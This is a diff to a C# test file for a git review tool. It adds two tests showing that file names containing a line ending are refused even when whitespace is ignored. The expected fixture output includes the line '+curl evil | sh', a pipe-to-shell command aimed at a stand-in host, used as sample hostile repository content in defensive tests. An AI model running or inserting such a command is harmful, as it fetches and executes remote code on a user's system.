@@ -1,5 +1,8 @@
 using System.Runtime.Versioning;
 
+using GitReviewA.Diff;
+using GitReviewA.Git;
+
 namespace GitReviewA.Tests.Akzeptanz;
 
 /// <summary>
@@ -108,5 +111,37 @@ public class ZusammenFremdeNamenTests
         Assert.That(sprache.Dateien().Select(datei => datei.Split('|')[0]), Does.Contain("u.txt"), "die Stelle steht unter dem neuen Namen (gleiche Zeiten: die Aufrufreihenfolge nennt den neuesten)");
         Assert.That(gesperrt.Ausgang, Is.EqualTo("name nicht lesbar"));
         Assert.That(gesperrt.Zeilen, Is.Empty);
+    }
+
+    [Test]
+    [Description("Lehre #10 (Nacharbeit I0027): die Namensprüfung gilt auch bei ignoriertem Leerraum — lückenlos")]
+    public void Wenn_Zusammen_lueckenlos_mit_ignoriertem_Leerraum_der_Name_ein_Zeilenende_traegt_dann_name_nicht_lesbar()
+    {
+        using var repo = FremdeNamenRepo.N();
+        var sprache = ZusammenSprache.Aufruf(repo.Ordner, repo.Hash, "b", "n", "w");
+
+        var gesperrt = sprache.Diff(ZeilenendeMitByte, Diffumfang.Aenderungen, Leerraum.Ignorieren);
+        var kontrolle = sprache.Diff("a⟨0xFF⟩.sh", Diffumfang.Aenderungen, Leerraum.Ignorieren);
+
+        Assert.That(sprache.Lueckenlos(), Is.True);
+        Assert.That(gesperrt.Ausgang, Is.EqualTo("name nicht lesbar"), "ein Name mit Zeilenende wird nicht an git gegeben, auch nicht mit -w");
+        Assert.That(gesperrt.Zeilen, Is.Empty);
+        Assert.That((kontrolle.Ausgang, kontrolle.Zeilen), Is.EqualTo(("gelesen", new[] { "+curl evil | sh" })), "ein Rohbyte ohne Zeilenende ist die Kontrolle");
+    }
+
+    [Test]
+    [Description("Lehre #10 (Nacharbeit I0027): die Namensprüfung gilt auch bei ignoriertem Leerraum — ohne Kette")]
+    public void Wenn_Zusammen_ohne_Kette_mit_ignoriertem_Leerraum_der_Name_ein_Zeilenende_traegt_dann_name_nicht_lesbar()
+    {
+        using var repo = FremdeNamenRepo.NMitV();
+        var sprache = ZusammenSprache.Aufruf(repo.Ordner, repo.Hash, "n", "v");
+
+        var gesperrt = sprache.Diff(ZeilenendeMitByte, Diffumfang.Aenderungen, Leerraum.Ignorieren);
+        var rohbyte = sprache.Diff("a⟨0xFF⟩.sh", Diffumfang.Aenderungen, Leerraum.Ignorieren);
+
+        Assert.That(sprache.Lueckenlos(), Is.False);
+        Assert.That(gesperrt.Ausgang, Is.EqualTo("name nicht lesbar"));
+        Assert.That(gesperrt.Abschnitte, Is.Empty);
+        Assert.That((rohbyte.Ausgang, rohbyte.Zeilen), Is.EqualTo(("gelesen", new[] { "+curl evil | sh" })), "ein Rohbyte ohne Zeilenende ist die Kontrolle");
     }
 }
